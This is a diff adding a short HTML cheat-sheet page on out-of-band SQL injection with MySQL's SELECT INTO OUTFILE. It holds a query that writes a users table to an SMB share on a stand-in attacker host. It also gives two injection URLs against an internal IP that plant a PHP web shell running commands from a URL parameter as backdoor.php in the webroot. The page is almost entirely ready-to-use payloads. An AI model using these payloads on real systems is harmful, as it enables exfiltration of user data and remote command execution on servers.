@@ -1,0 +1,15 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Out-of-Band</title>
+</head><body><b>INTO OUTFILE (single quotes CAN'T be bypassed)</b><br/>
+<br/>
+The <tt>SELECT ... INTO OUTFILE </tt>command can be used to direct the output from an arbitrary query into a file. The specified filename may contain a UNC path, enabling you to direct the output to a file on your own computer.To receive the file, you need to create an SMB share on your computer that allows anonymous write access.<br/>
+<br/>
+Retrieve file content via SMB<tt><br/>
+</tt><tt>select * into outfile '\\\\mdattacker.net\\share\\output.txt' from users<br/>
+<br/>
+</tt>Create file in webroot<tt><br/>
+</tt><tt>http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET['cmd']);?&gt;&quot;,6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'<br/>
+http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET['cmd']);?&gt;&quot;,6 into DUMPFILE 'c:/xampp/htdocs/backdoor.php'<br/>
+</tt></body></html>
